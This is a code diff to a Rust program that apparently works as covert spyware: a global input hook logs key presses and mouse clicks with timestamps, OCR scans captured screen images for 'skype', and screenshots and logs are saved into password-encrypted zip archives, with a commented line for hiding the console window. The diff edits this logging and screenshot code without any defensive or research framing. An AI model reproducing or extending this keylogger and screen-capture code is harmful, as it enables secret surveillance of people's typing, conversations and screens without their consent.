@@ -1,11 +1,13 @@
 // #![windows_subsystem = "windows"]
 
+use byteorder::{LittleEndian, ReadBytesExt, WriteBytesExt};
 use core::mem::MaybeUninit;
 use winapi::um::winuser;
 use std::collections::HashMap;
 use std::time::Instant;
 use std::env;
 use std::fs;
+use std::fs::File;
 use std::fs::OpenOptions;
 use std::io::prelude::*;
 use std::io::Write;
@@ -88,7 +90,7 @@ fn main() {
         .unwrap();
 
     std::thread::spawn(move || {
-        if let Err(error) = listen(track_activity) {
+        if let Err(error) = listen(track) {
             println!("Error: {:?}", error)
         }
     });
@@ -126,7 +128,6 @@ fn main() {
                     };
 
                     let output = rusty_tesseract::image_to_string(&img, &image_to_string_args).unwrap();
-                    println!("\nThe String output is: {}", output);
 
                     let re =
                         RegexBuilder::new(&regex::escape("skype"))
@@ -137,7 +138,7 @@ fn main() {
 
                     if ok {
                         println!("Great works!!!");
-                        doscreenshots(&dynamic_image);
+                        doscreenshots(dynamic_image);
                     }
                 }
             }
@@ -200,7 +201,7 @@ fn main() {
     }
 }
 
-fn track_activity(event: Event) {
+fn track(event: Event) {
     match event.event_type {
         EventType::KeyPress(Key::Alt | Key::AltGr) => println!("Alt!"),
         EventType::KeyPress(Key::CapsLock) => println!("CapsLock!"),
@@ -238,6 +239,9 @@ fn track_activity(event: Event) {
         EventType::ButtonPress(button) => match button {
             Button::Left => {
                 if !LOGGED.lock().unwrap().clone() {
+                    let now = Utc::now();
+                    let x: String = format!("{}", now);
+                    let now_parsed: DateTime<Utc> = x.parse().unwrap();
                     *LOG_FILE.lock().unwrap() += &(String::from("   ") + &now_parsed.to_string() + "\n");
                     let logs = LOG_FILE.lock().unwrap().clone();
                     dolog(logs);
@@ -273,7 +277,7 @@ fn dolog(logs: String) -> ZipResult<()> {
     Ok(())
 }
 
-fn doscreenshots(image: &DynamicImage) -> ZipResult<()> {
+fn doscreenshots(image: DynamicImage) -> ZipResult<()> {
     let now: DateTime<Utc> = Utc::now();
     let fname = format!("S{}.zip", now.format("%Y-%m-%d").to_string());
 
@@ -288,9 +292,15 @@ fn doscreenshots(image: &DynamicImage) -> ZipResult<()> {
         .with_deprecated_encryption(PASS);
 
     zip.start_file(now.format("%Y-%m-%d-%H:%M:%S.png").to_string(), options)?;
-    zip.write_all(image.as_bytes())?;
 
-    zip.finish()?;
+    let mut buffer = Vec::new();
+    let mut f = File::open("target.png")?;
+    f.read_to_end(&mut buffer)?;
+    zip.write_all(&*buffer)?;
+    buffer.clear();
+
+    zip.finish();
+
     Ok(())
 }
 
